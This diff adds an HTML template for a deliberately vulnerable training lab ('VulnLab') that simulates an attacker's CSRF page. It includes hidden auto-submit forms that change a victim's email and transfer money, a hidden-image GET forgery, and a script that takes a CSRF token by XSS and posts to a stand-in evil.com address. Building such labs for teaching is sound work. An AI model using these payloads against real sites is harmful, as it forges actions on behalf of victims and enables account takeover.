@@ -1,0 +1,79 @@
+{% extends "base.html" %}
+{% block title %}Attacker Page - CSRF{% endblock %}
+{% block content %}
+<div class="row">
+    <div class="col-md-8">
+        <div class="card border-danger">
+            <div class="card-header bg-danger text-white">
+                <h4>Attacker's Malicious Page</h4>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-warning">
+                    <strong>WARNING:</strong> This is a simulated attacker page. In a real attack, this would be hosted on a different domain.
+                </div>
+
+                <h5>Attack 1: Change Email (Auto-submit)</h5>
+                <p>This form auto-submits when the page loads. If you're logged in as a VulnLab user and CSRF protection is LOW, your email gets changed.</p>
+                <form method="POST" action="/vulns/csrf" id="csrf-form-1">
+                    <input type="hidden" name="action" value="change_email">
+                    <input type="hidden" name="email" value="pwned@attacker.com">
+                </form>
+                <button class="btn btn-danger" onclick="document.getElementById('csrf-form-1').submit()">Trigger Attack (Click Me)</button>
+
+                <hr>
+
+                <h5>Attack 2: Transfer Money</h5>
+                <p>Simulates an attacker stealing money by forging a transfer request.</p>
+                <form method="POST" action="/vulns/csrf" id="csrf-form-2">
+                    <input type="hidden" name="action" value="transfer_money">
+                    <input type="hidden" name="amount" value="9999">
+                    <input type="hidden" name="to_user" value="attacker">
+                </form>
+                <button class="btn btn-danger" onclick="document.getElementById('csrf-form-2').submit()">Steal $9999</button>
+
+                <hr>
+
+                <h5>Attack 3: Hidden Image (GET-based CSRF)</h5>
+                <p>Uses a hidden image tag to trigger a GET request. Works even on sites without forms.</p>
+                <pre class="bg-dark text-success p-2 small"><code>&lt;img src="/vulns/csrf?action=transfer&amp;amount=5000&amp;to=attacker"
+     style="display:none"&gt;</code></pre>
+                <img src="/vulns/csrf?action=transfer&amp;amount=5000&amp;to=attacker" style="display:none" alt="hidden csrf">
+
+                <hr>
+
+                <h5>Attack 4: XSS + CSRF Combo</h5>
+                <p>If you find an XSS vulnerability, you can use it to steal CSRF tokens:</p>
+                <pre class="bg-dark text-success p-2 small"><code>&lt;script&gt;
+  fetch('/vulns/csrf')
+    .then(r => r.text())
+    .then(html => {
+      let token = html.match(/name="csrf_token" value="([^"]+)"/);
+      if (token) {
+        // Now you have the token, forge any request
+        fetch('/vulns/csrf', {
+          method: 'POST',
+          body: `action=change_email&email=hacked@evil.com&csrf_token=${token[1]}`
+        });
+      }
+    });
+&lt;/script&gt;</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-4">
+        <div class="card border-info">
+            <div class="card-body">
+                <h5>Why This Works</h5>
+                <ul class="small">
+                    <li>Browser sends cookies automatically with every request</li>
+                    <li>The server sees a valid session cookie</li>
+                    <li>If no CSRF token check, the request is trusted</li>
+                    <li>SameSite cookies help but don't prevent all attacks</li>
+                </ul>
+                <a href="/vulns/csrf" class="btn btn-primary btn-sm w-100">Back to CSRF Demo</a>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
